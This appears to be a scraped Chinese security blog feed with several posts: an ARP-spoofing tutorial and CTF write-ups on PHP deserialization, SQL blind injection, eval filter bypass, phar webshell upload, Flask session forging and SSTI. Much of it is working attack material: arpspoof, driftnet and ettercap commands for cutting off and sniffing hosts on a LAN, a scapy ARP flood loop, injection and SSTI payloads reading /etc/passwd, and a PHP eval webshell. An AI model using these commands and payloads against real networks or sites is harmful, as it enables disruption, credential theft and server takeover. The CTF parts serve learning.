title="arpspoof"></a>arpspoof</h3><p>大家好，我是练习时长两小时半的个人练习生，喜欢唱、跳、arp，突发奇想想学一下rap，研究了大半天发现工具基本上用不了，arpattacker的自动攻击频率太低，所以只能自己写包（dbp，不会自己写，菜哭），之后尝试了下Windows的arpspoof简单软件，可以实现对手机ip的断网操作，但是电脑无法断开，在linux上安装了arpspoof，安装和虚拟机的网络上遇到了一些问题，下面记录一下问题的解决方法。</p><h4 id="安装arpspoof"><a href="#安装arpspoof" class="headerlink" title="安装arpspoof"></a>安装arpspoof</h4><pre><code>apt-get install dsniff ssldump</code></pre><h4 id="虚拟机网络问题"><a href="#虚拟机网络问题" class="headerlink" title="虚拟机网络问题"></a>虚拟机网络问题</h4><p>需要使用桥接模式，直接连接物理网络，在NAT模式中，执行攻击命令时会报错</p><pre><code>libnet_open_link(): UID/EUID 0 or capability CAP_NET_RAW required</code></pre><p>NAT模式会共享主机的ip地址。</p><h4 id="查询和攻击命令"><a href="#查询和攻击命令" class="headerlink" title="查询和攻击命令"></a>查询和攻击命令</h4><p>查询本机网卡和ip地址</p><pre><code>ifconfig</code></pre><p>查询网关</p><pre><code>route -n</code></pre><p>查询连接在局域网的ip地址</p><pre><code>fping -asg 192.168.1.0/24fping -asg 网口.0/24nmap -sP 192.168.1.0/24nmap -sP 网口.0/24</code></pre><p>攻击命令</p><pre><code>sudo -s arpspoof -i ens33 -t 192.168.1.102 192.168.1.1sudo -s arpspoof -i 网卡 -t 攻击ip  网关</code></pre><h3 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h3><p>IP转发：</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forwardcat /proc/sys/net/ipv4/ip_forward</code></pre><p>图片捕获：（流量转发后网页浏览很卡，很多图片和网站打不开，体验极差</p><pre><code>driftnet -i ens33</code></pre><p>抓取账号密码：（好像已经没用了，试了几个网站都抓不到</p><pre><code>ettercap -Tq -i eth0</code></pre><h3 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h3><p>Linux下实现arp攻击scapy是一个很好的工具，还是先从断网开始，</p><pre><code>p = Ether()/ARP()//构造一个包p.hwdst = &apos;b4:6d:83:88:24:08&apos; //要攻击的主机mac地址p.pdst = &apos;192.168.1.108&apos;  //要攻击的主机的ipp.psrc = &apos;192.168.1.1&apos;   //网关ipp.hwsrc = &apos;aa:aa:aa:aa:aa:aa&apos;  //随便写个mac地址while 1: sendp(p,inter=0.005,count=9999)//无限发送，按Ctrl+z停止发送</code></pre><p>csdn上的一篇文章，原文链接：<a href="https://blog.csdn.net/qq_35315699/article/details/73863632" target="_blank" rel="noopener">https://blog.csdn.net/qq_35315699/article/details/73863632</a></p><p>之后再学一下怎么用python写包（咕~，话说有内网我是不是可以直接用wireshark？？？？</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;折腾了大半天，最后也只是了解了arp攻击一些最基础的语句，可扫描当前局域网下连接的ip地址，对指定的ip断网，局限性很高，需要在内网，仅限日常娱乐，一些监听之类的操作还需要补知识（菜是原罪）。&lt;/p&gt;
&lt;h3 id=&quot;ARP欺骗原理&quot;&gt;&lt;a href=&quot;#ARP欺骗原理&quot; class=&quot;headerlink&quot; title=&quot;ARP欺骗原理&quot;&gt;&lt;/a&gt;ARP欺骗原理&lt;/h3&gt;&lt;p&gt;其主要原理是局域网内的”攻击机”通过冒充同网络号下的”受害者主机”的物理地址（mac地址），通过欺骗网关，让网关原来应该发给“受害者主机”的数据包转而发给“攻击机”，这就导致了“受害者主机”无法收到应答的数据包，也就等于断网了。本实验的过程也就是常说的  ARP欺骗。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>国赛做题+补题</title>
    <link href="http://yoursite.com/2019/04/28/%E5%9B%BD%E8%B5%9B%E5%81%9A%E9%A2%98-%E8%A1%A5%E9%A2%98/"/>
    <id>http://yoursite.com/2019/04/28/国赛做题-补题/</id>
    <published>2019-04-28T02:37:10.000Z</published>
    <updated>2019-07-29T03:38:36.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="国赛WP"><a href="#国赛WP" class="headerlink" title="国赛WP"></a>国赛WP</h2><p>第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。<br><a id="more"></a></p><h3 id="web1-just-soso"><a href="#web1-just-soso" class="headerlink" title="web1 just soso"></a>web1 just soso</h3><p>看源码发现提示</p><pre><code>&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;</code></pre><p>php封装协议file=php://filter/read=convert.base64-encode/resource=hint.php可读index.php和hint.php的源码，base64解码得到源码如下</p><pre><code> Index.php&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET[&quot;file&quot;]; $payload = $_GET[&quot;payload&quot;];if(!isset($file)){echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;}if(preg_match(&quot;/flag/&quot;,$file)){die(&apos;hack attacked!!!&apos;);}@include($file);if(isset($payload)){  $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);parse_str($url[&apos;query&apos;],$query);foreach($query as $value){    if (preg_match(&quot;/flag/&quot;,$value)) {         die(&apos;stop hacking!&apos;);        exit();    }}$payload = unserialize($payload);}else{   echo &quot;Missing parameters&quot;; } ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt;Hint.php&lt;?php  class Handle{ private $handle;  public function __wakeup(){    foreach(get_object_vars($this) as $k =&gt; $v) {        $this-&gt;$k = null;    }    echo &quot;Waking up\n&quot;;}public function __construct($handle) {     $this-&gt;handle = $handle; } public function __destruct(){    $this-&gt;handle-&gt;getFlag();}}class Flag{public $file;public $token;public $token_flag;function __construct($file){    $this-&gt;file = $file;    $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));}public function getFlag(){    $this-&gt;token_flag = md5(rand(1,10000));    if($this-&gt;token === $this-&gt;token_flag)    {        if(isset($this-&gt;file)){            echo @highlight_file($this-&gt;file,true);         }      }}}?&gt;</code></pre><p>可以看到是反序列化的问题，存在正则匹配ban掉了“flag”，所以不能直接读flag.php，反序列化构造中也需要用到flag，url地址三斜杠可绕过foreach的遍历；<br>__wakeup中会this-&gt;$k = null;会将this指向空，需要绕过，__wakeup触发于unserilize()调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得__wakeup失效。所以再反序列化后，将Handle类的对象个数改变就可绕过；<br>MD5的if($this-&gt;token === $this-&gt;token_flag)<br>本来以为是伪随机数种子，后来发现只需让$F-&gt;token=&amp;$F-&gt;token_flag;即可<br>&amp;表示取变量，让两个变量值关联起来</p><p>反序列化脚本</p><pre><code>&lt;?phpclass Handle{ private $handle;  public function __wakeup(){    foreach(get_object_vars($this) as $k =&gt; $v) {        $this-&gt;$k = null;    }    echo &quot;Waking up\n&quot;;}public function __construct($handle) {     $this-&gt;handle = $handle; } public function __destruct(){    $this-&gt;handle-&gt;getFlag();}}class Flag{public $file;public $token;public $token_flag;function __construct($file){    $this-&gt;file = $file;    $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));}public function getFlag(){    $this-&gt;token_flag = md5(rand(1,10000));    if($this-&gt;token === $this-&gt;token_flag)    {        if(isset($this-&gt;file)){            echo @highlight_file($this-&gt;file,true);         }      }}}$F = new Flag(&apos;flag.php&apos;);$F-&gt;token=&amp;$F-&gt;token_flag;$H  = new Handle($F);$test =  serialize($H);echo $test?&gt;</code></pre><p>由于private的特性，需要在Handle和handle对象前面加上%00 或者/00<br>，\00但是前面的就应该改为S，不是s，因为如果是S那么类似\00abc 就是\0 a b c 四个字符，所以就是S:14:”\00Handle\00handle”</p><pre><code>payload：O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:  {s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;12f73080e04ce0d8e95defb577ebc3f4&quot;;  s:10:&quot;token_flag&quot;;R:4;}}</code></pre><p>最终payload：</p><pre><code>http://cce097dcc8944553906620bb82f4ad36dd057d6462bd4e30.changame.ichunqiu.com  ///?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;  O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:  &quot;token&quot;;s:32:&quot;12f73080e04ce0d8e95defb577ebc3f4&quot;;s:10:&quot;token_flag&quot;;R:4;}}</code></pre><p>拿到flag</p><h3 id="web2-全世界最简单的SQL"><a href="#web2-全世界最简单的SQL" class="headerlink" title="web2 全世界最简单的SQL"></a>web2 全世界最简单的SQL</h3><p>过滤了一堆东西，or<br>|<br>benchmark<br>sleep<br>if<br>get_lock<br>case  </p><p>时间盲注过滤了三个sleep、benchmark和get_lock函数，但是后来超哥发现可以通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><pre><code>admin&apos; union select rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;)#</code></pre><p>确实可以产生延迟，但是延迟之后是404，而且由于过滤了if，无法通过延迟进行查询，卡住）<br>之后队友发现通过pow函数，在某一特定范围内显示的登陆失败，超过某一范围是数据库操作失败，测试后发现’ union select pow(2,2014) #数据库操作失败，2013就是登陆失败，以此结合查询语句找到数据库名<br>语句：</p><pre><code>a&apos;union select pow(2,1997+ascii(substr(database(),1,1)))#</code></pre><p>不知道为啥python显示中文为乱码，后来发现需要a.content.decode(‘utf-8’),虚拟机里跑不出来，需要装个python环境了</p><pre><code>import requestsi=96j=0r=requests.session()for j&lt;20:  while i&lt;156:        url=&apos;http://7325a6806d8140fd91c5b9b3082a6ed240b2e3ab52c64a46.changame.ichunqiu.com/?tdsourcetag=s_pctim_aiomsg&apos;   data={&apos;username&apos;:&apos;a\&apos;union select pow(2,&quot;+str(2013-i)&quot;+ascii(substr(database(),&quot;+str(j)+&quot;,1))) #&apos;,&apos;password&apos;:&apos;1&apos;}   a=r.post(url,data=data)   if&quot;数据库操作失败&quot;in a.content.decode(&apos;utf-8&apos;):       print(i)       break   else :i=i+1   j=j+1   print(i)</code></pre><p>得到数据库名ctf，现在问题是or被ban了，information也不能用了，没法查表名没法查列名，老大说可以子查询绕过，通过构造子查询 给本来被ban（或者爆不出）的字段名换了个”名字”<br>先构造子查询的联合查询语句并指定别名</p><pre><code>1&apos; UNION SELECT 1,2,admin_x,4,5 FROM (SELECT 1 as admin_1,2 as admin_2,3 as admin_3 from admin WHERE 1=2 UNION SELECT * from admin)x %23</code></pre><p>猜到表名为user，照着老大的博客构造还弄了好久，那个别名需要定义，否则会出错</p><pre><code>a&apos; union select pow(2,1997+ascii(substr((select  admin_2 from (select 1 as admin_1 ,2 as admin_2 from user where 1=2 union select * from user)x) ,2,1))) #</code></pre><p>改造上面的脚本爆出密码（队友爆出来的，脚本出了问题，burp手注，太慢了，菜醒）<br>得到密码登陆。</p><p>其他师傅们的思路 select cot(0)报错，select cot(1) 可以执行，之后就是布尔盲注结合子查询。</p><h3 id="web3-love-math"><a href="#web3-love-math" class="headerlink" title="web3 love_math"></a>web3 love_math</h3><pre><code>&lt;?php  error_reporting(0);  //听说你很喜欢数学，不知道你是否爱它胜过爱flag  if(!isset($_GET[&apos;c&apos;])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET[&apos;c&apos;]; if (strlen($content) &gt;= 80) {     die(&quot;太长了不会算&quot;); } $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;]; foreach ($blacklist as $blackitem) {     if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) {         die(&quot;请不要输入奇奇怪怪的字符&quot;);     } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); foreach ($used_funcs[0] as $func) {     if (!in_array($func, $whitelist)) {         die(&quot;请不要输入奇奇怪怪的函数&quot;);     } } //帮你算出答案 eval(&apos;echo &apos;.$content.&apos;;&apos;); }</code></pre><p>有个eval  </p><p>‘.’可以实现字符串的拼接，后来发现对16进制及以上进制异或运算可以得到字母，所给白名单又有base_convert函数，构造</p><pre><code>base_convert(1751504350,10,36)(base_convert(784,10,36));（语句是system（ls））</code></pre><p>看得到flag，但是现在问题是，cat flag.php 需要空格和.,用<em>代替发现还是需要空格，cat&lt;f</em>中&lt;又被处理成了小于号，卡住）</p><p>异或运算，用两个白名单函数和空格+<em>异或，得到十进制数字，dechex后<br>再与那两个白名单函数异或，就可以回到空格</em>，就可以执行system（cat *）拿到flag<br>，队友写的脚本，还不会写php，回头研究下（菜是原罪</p><pre><code>base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(19)^tan^exp))（语句是system(cat *)点号将cat和 *拼接了起来</code></pre><p>其他队伍使用的是 system(getallheaders(){9})，然后在headers里传了个9，tql⑧。</p><h3 id="web4-RefSpace"><a href="#web4-RefSpace" class="headerlink" title="web4 RefSpace"></a>web4 RefSpace</h3><p>文件包含，前面有文件读取操作<br>phar://<br>将  </p><pre><code>&lt;?php @eval($_POST[a]);?&gt;</code></pre><p>写入1.php，将1.php压缩到1.zip，改后缀为1.jpg</p><pre><code>?route=phar://upload/1.jpg.jpg/&amp;a=</code></pre><p>用蚁剑连接可以拿shell；</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;国赛WP&quot;&gt;&lt;a href=&quot;#国赛WP&quot; class=&quot;headerlink&quot; title=&quot;国赛WP&quot;&gt;&lt;/a&gt;国赛WP&lt;/h2&gt;&lt;p&gt;第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>flask伪造session</title>
    <link href="http://yoursite.com/2019/04/07/flask%E4%BC%AA%E9%80%A0session/"/>
    <id>http://yoursite.com/2019/04/07/flask伪造session/</id>
    <published>2019-04-07T13:48:30.000Z</published>
    <updated>2019-04-07T14:20:26.001Z</updated>
    
    <content type="html"><![CDATA[<h2 id="flask伪造session"><a href="#flask伪造session" class="headerlink" title="flask伪造session"></a>flask伪造session</h2><p>github的脚本<br><a id="more"></a></p><pre><code>&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;__author__ = &apos;Wilson Sumanang, Alexandre ZANNI&apos;import sysimport zlibfrom itsdangerous import base64_decodeimport astimport argparseparser = argparse.ArgumentParser(        description=&apos;Flask Session Cookie Decoder/Encoder&apos;,        epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)subparsers = parser.add_subparsers(help=&apos;sub-command help&apos;, dest=&apos;subcommand&apos;)parser_encode = subparsers.add_parser(&apos;encode&apos;, help=&apos;encode&apos;)parser_encode.add_argument(&apos;-s&apos;, &apos;--secret-key&apos;, metavar=&apos;&lt;string&gt;&apos;,                        help=&apos;Secret key&apos;, required=True)parser_encode.add_argument(&apos;-t&apos;, &apos;--cookie-structure&apos;, metavar=&apos;&lt;string&gt;&apos;,                        help=&apos;Session cookie structure&apos;, required=True)parser_decode = subparsers.add_parser(&apos;decode&apos;, help=&apos;decode&apos;)parser_decode.add_argument(&apos;-s&apos;, &apos;--secret-key&apos;, metavar=&apos;&lt;string&gt;&apos;,                        help=&apos;Secret key&apos;, required=False)parser_decode.add_argument(&apos;-c&apos;, &apos;--cookie-value&apos;, metavar=&apos;&lt;string&gt;&apos;,                        help=&apos;Session cookie value&apos;, required=True)args = parser.parse_args()from flask.sessions import SecureCookieSessionInterfaceclass MockApp(object):def __init__(self, secret_key):    self.secret_key = secret_keydef session_cookie_encoder(secret_key, session_cookie_structure):&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;try:    app = MockApp(secret_key)    session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))    si = SecureCookieSessionInterface()    s = si.get_signing_serializer(app)    return s.dumps(session_cookie_structure)except Exception as e:    return &quot;[Encoding error]{}&quot;.format(e)def session_cookie_decoder(session_cookie_value, secret_key=None):&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;try:    if(secret_key==None):        compressed = False        payload = session_cookie_value        if payload.startswith(b&apos;.&apos;):            compressed = True            payload = payload[1:]        data = payload.split(&quot;.&quot;)[0]        data = base64_decode(data)        if compressed:            data = zlib.decompress(data)        return data    else:        app = MockApp(secret_key)        si = SecureCookieSessionInterface()        s = si.get_signing_serializer(app)        return s.loads(session_cookie_value)except Exception as e:    return &quot;[Decoding error]{}&quot;.format(e)if __name__ == &quot;__main__&quot;:if(args.subcommand == &apos;encode&apos;):    if(args.secret_key is not None and args.cookie_structure is not None):        print(session_cookie_encoder(args.secret_key, args.cookie_structure))elif(args.subcommand == &apos;decode&apos;):    if(args.secret_key is not None and args.cookie_value is not None):        print(session_cookie_decoder(args.cookie_value,args.secret_key))    elif(args.cookie_value is not None):        print(session_cookie_decoder(args.cookie_value))</code></pre><p>#</p><pre><code>加密示例 $ python2 session_cookie_manager.py encode -s &apos;.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&apos; -t &apos;{&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;}&apos;输出：eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw解密示例 $ python2 session_cookie_manager.py decode -c &apos;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&apos; -s &apos;.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&apos;输出：{u&apos;username&apos;: &apos;admin&apos;, u&apos;number&apos;: &apos;326410031505&apos;}无密钥：$ python2 session_cookie_manager.py decode -c &apos;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&apos;</code></pre><p>hgame的happypython就是先解密session再将id改为1后加密，替换session即可登陆。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;flask伪造session&quot;&gt;&lt;a href=&quot;#flask伪造session&quot; class=&quot;headerlink&quot; title=&quot;flask伪造session&quot;&gt;&lt;/a&gt;flask伪造session&lt;/h2&gt;&lt;p&gt;github的脚本&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SSTI(1)</title>
    <link href="http://yoursite.com/2019/04/07/SSTI-1/"/>
    <id>http://yoursite.com/2019/04/07/SSTI-1/</id>
    <published>2019-04-07T01:52:33.000Z</published>
    <updated>2019-04-07T14:20:27.185Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间被转专业考试逼疯，鸽了一堆比赛（不鸽也不会做，菜哭）把之前的知识补一下，从cg讲的ssti开始吧。<br>hexo插件问题会把两个大括号里的内容按变量处理，下文用一个代替<br><a id="more"></a></p><h2 id="SSTI服务器模板注入"><a href="#SSTI服务器模板注入" class="headerlink" title="SSTI服务器模板注入"></a>SSTI服务器模板注入</h2><p>什么是SSTI？</p><p>SSTI全称Server-Side-Template-Injection，即服务端模版注入攻击。</p><p>攻击成因是服务端模版引擎将用户的输入直接渲染进模版，而未做过滤或者对象关系映射(ORM)。</p><p>这样，攻击者可以控制渲染进模版的内容。通过直接输入模版渲染的关键词例如{ }，即可将恶意代码注入模版中执行。最严重的后果是getshell。</p><p>现在有很多常见的模版渲染引擎，而最常用也最长出问题的Web框架就是基于Python的Flask框架了。</p><h2 id="注入姿势："><a href="#注入姿势：" class="headerlink" title="注入姿势："></a>注入姿势：</h2><h3 id="内省config对象"><a href="#内省config对象" class="headerlink" title="内省config对象"></a>内省config对象</h3><p>config对象是一个Flask模板全局变量，代表“当前配置对象(flask.config）”。它是一个类似于字典的对象，其中包含了应用程序所有的配置值，包含若干独特方法的子类：from_envvar，from_object，from_pyfile，以及root_path。在大多数情况下，会包含数据库连接字符串，第三方服务凭据，SECRET_KEY之类的敏感信息。</p><p>对于新加载的模块，from_object方法会将那些变量名全是大写的属性添加到config对象中。注入payload{ config.items() }就可以轻松查看这些配置了。　　</p><h3 id="使用非常重要的内省组件：-mro-和-subclasses-属性。"><a href="#使用非常重要的内省组件：-mro-和-subclasses-属性。" class="headerlink" title="使用非常重要的内省组件：__mro__和__subclasses__属性。"></a>使用非常重要的内省组件：__mro__和__subclasses__属性。</h3><p>__mro__中的MRO代表方法解析顺序，并且在这里定义为，“是一个包含类的元组，而其中的类就是在方法解析的过程中在寻找父类时需要考虑的类”。__mro__属性以包含类的元组来显示对象的继承关系，它的父类，父类的父类，一直向上到object（如果是使用新式类的话）。它是每个对象的元类属性，但它却是一个隐藏属性，因为Python在进行内省时明确地将它从dir的输出中移除了（见Objects/object.c的第1812行）。</p><p>__subclasses__属性则在这里被定义为一个方法，“每个新式类保留对其直接子类的一个弱引用列表。此方法返回那些引用还存在的子类”。</p><p>使用__mro__属性来访问对象的父类，使用__subclasses__属性来访问对象的子类</p><p>使用索引2来选择object类。现在我们到达了object类，我们使用/<strong>subclasses</strong>属性来dump应用程序中使用的所有类（找到file类的索引）<br>找到object:<br>    { ‘’.__class__.__mro__[2].__subclasses__() }</p><p>任意文件读取：<br>    { ‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read() }</p><h4 id="os-模块"><a href="#os-模块" class="headerlink" title="[os]模块"></a>[os]模块</h4><p>通过os模块可以进行一些文件的操作</p><pre><code>{[].\__class__.\__base__.\__subclasses__()}</code></pre><p>的方法来访问所有模块<br><img src="https://img-blog.csdn.net/20181004223429919?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br>访问os模块都是从warnings.catch_warnings模块入手的。找到catch_warnings的位置(上面查到的所有模块的索引，这里是59，即第59个模块)；</p><p>知道了位置后，再用func_globals看看该模块有哪些global函数;</p><p>在url后面输入<br>    {[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}<br><img src="https://img-blog.csdn.net/20181004224339752?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br>这里能看到linecache，我们要访问的os模块就在这里，现在我们看看这个模块的各种属性：</p><p>在url后面输入<br>    {[].__class__.__base__.__subclasses__()[59].__init__.func_globals[‘linecache’].__dict__}<br>然后在很长的返回值里就可以找到os模块了<br>然后就可以用</p><pre><code>{[].\__class__.\__base__.\__subclasses__()[59].\__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;]}</code></pre><p>来代替os模块的使用了，之所以写__dict__[‘o’+’s’]，而不写__dict__[‘os’],是因为os这个字符串被禁用了，只能使用python里面字符串的拼接绕过现在os.read()</p><pre><code>[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].read()[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].open()[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].listdir(&apos;.&apos;)</code></pre><p>cg题的payload</p><pre><code>http://ssh2.evi0s.com:8080/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].listdir(&apos;..&apos;)%7D%7D 看到flag文件文件读取打开http://ssh2.evi0s.com:8080/%7B%7B[].__class__.__base__.__subclasses__()[40](&apos;/Th1s_th3_fl1l1l11llll1g&apos;).read()%7D%7D </code></pre><p>过滤了class怎么办，base64编码绕过，招新赛的payload</p><pre><code>http://132.232.92.163:6733/?name={[].__getattribute__(&apos;X19jbGFzc19f%27.decode(%27base64&apos;)).__base__.__getattribute__([].__getattribute__(&apos;X19jbGFzc19f&apos;.decode(&apos;base64&apos;)).__base__,&apos;X19zdWJjbGFzc2VzX18=&apos;.decode(&apos;base64&apos;))()[58].__init__.func_globals[&apos;linecache&apos;].__dict__.os.listdir(&quot;/home/blacsheep/&quot;)} </code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间被转专业考试逼疯，鸽了一堆比赛（不鸽也不会做，菜哭）把之前的知识补一下，从cg讲的ssti开始吧。&lt;br&gt;hexo插件问题会把两个大括号里的内容按变量处理，下文用一个代替&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>hgame(php)</title>
    <link href="http://yoursite.com/2019/02/14/hgame-php/"/>
    <id>http://yoursite.com/2019/02/14/hgame-php/</id>
    <published>2019-02-14T02:07:57.000Z</published>
    <updated>2019-08-02T09:01:38.615Z</updated>
    
    <content type="html"><![CDATA[<p>杭电vidar的hgame，其中几道php的题，写一下学到的。<br><a id="more"></a></p><h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><p><img src="/2019/02/14/hgame-php/1.jpg" alt=" "></p><p>十多个php的绕过，题目挂了，用了一个师傅博客里的图片（之前忘写了，懒~）  </p><h5 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h5><p><img src="/2019/02/14/hgame-php/2.jpg" alt=" "><br>==和!=之间不会去判断数据类型，1和2又都被强制转换为了字符型，所以不能用数组，可用0e开头的MD5值绕过  </p><h5 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h5><p><img src="/2019/02/14/hgame-php/3.jpg" alt=" "><br>===则会判断数据类型，两个必须完全相等才返回true，所以用数组绕过，不同值的数组都返回0（详细见<a href="https://blog.csdn.net/qq_19980431/article/details/83018232）" target="_blank" rel="noopener">https://blog.csdn.net/qq_19980431/article/details/83018232）</a></p><h5 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h5><p><img src="/2019/02/14/hgame-php/4.jpg" alt=" "></p><p>php里的特性+和.会被解析为_,所以H_game写为H+game,或者是$_SERVER[‘QUERY_STRING’] 是不会自动URLDecode 的，所以我们只需要传个URL编码过的参数名即可绕过这里</p><h5 id="（4）"><a href="#（4）" class="headerlink" title="（4）"></a>（4）</h5><p><img src="/2019/02/14/hgame-php/5.jpg" alt=" ">  </p><p>数组绕过</p><h5 id="（5）"><a href="#（5）" class="headerlink" title="（5）"></a>（5）</h5><p><img src="/2019/02/14/hgame-php/6.jpg" alt=" "><br>这里被难住了，必须是http开头，开头的提示为admin.php,本来想着可以file协议忽略前面的地址直接读取文件内容，但是http的限制没法绕过<br><img src="/2019/02/14/hgame-php/a.png" alt=" "><br>parse_url 里的 PHP_URL_HOST 参数获取的是 最后一个@ 符号后面的域名，而 curl 使用的是第一个 @ 符号后面的域名，又有only localhost的提示，这样我们就可以用 http:<a href="mailto://@127.0.0.1" target="_blank" rel="noopener">//@127.0.0.1</a>:<a href="mailto:80@www.baidu.com" target="_blank" rel="noopener">80@www.baidu.com</a>/admin.php 来绕过,从而读取admin.php</p><h5 id="（6）"><a href="#（6）" class="headerlink" title="（6）"></a>（6）</h5><p><img src="/2019/02/14/hgame-php/7.jpg" alt=" 